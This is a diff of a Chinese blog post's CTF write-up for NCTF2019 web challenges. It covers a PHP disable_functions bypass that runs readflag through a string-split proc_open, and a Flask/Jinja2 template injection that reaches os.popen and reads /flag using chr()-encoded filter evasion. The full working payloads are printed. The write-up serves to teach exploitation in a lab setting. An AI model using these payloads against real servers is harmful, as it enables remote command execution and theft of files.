@@ -60,7 +60,17 @@
 <p>本以为这样读flag就结束了，可是它竟然读不了。。。后来看到了readflag就知道是要用这个读啦，盲猜readflag的内容是cat /flag，所以想办法执行readflag就行了，返回去看disable_functions，ban了那么多函数，以为命令执行函数早被禁完了，但是最终发现没有ban proc_open函数，所以用它执行readflag命令，最终payload如下</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//nctf2019.x1ct34m.com:60004/?code=$test="../../.././readflag";%0a$z='p'.'ipe';%0a$b='proc'.'_open';%0a$c='var_d'.'ump';%0a$d='strea'.'m_get_c'.'ontents';%0a$e='proc_c'.'lose';%0a$a=array(array("$z","r"),array("$z","w"),array("$z","w"));%0a$fp = $b($test,$a,$zs);%0a$c($d($zs[1]));%0a$e($fp);&amp;useful=index.php</span></span><br></pre></td></tr></table></figure>
 
-<p>这里涉及挺多函数的，等过几天把做题经常遇到的函数总结一下。</p>
+
+
+<p>5.flask</p>
+<p>额，这是一个Flask模板注入 ，具体原因可以看这篇文章    <a href="https://xz.aliyun.com/t/3679" target="_blank" rel="noopener">传送门</a></p>
+<p>直接上payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:<span class="number">40007</span>/&#123;&#123;<span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.linecache.os.popen(<span class="string">'ls ..'</span>).read()&#125;&#125;	//执行命令</span><br></pre></td></tr></table></figure>
+
+<p>这里看到了flag直接cat ../flag是禁止的，于是用ascii编码绕过，最终payload为</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://nctf2019.x1ct34m.com:<span class="number">40007</span>/&#123;% set chr=().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(chr(<span class="number">47</span>)+chr(<span class="number">102</span>)+chr(<span class="number">108</span>)+chr(<span class="number">97</span>)+chr(<span class="number">103</span>)).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这些题涉及挺多知识的，等过几天有空把做题经常遇到的知识总结一下。</p>
 ]]></content>
       <tags>
         <tag>web</tag>
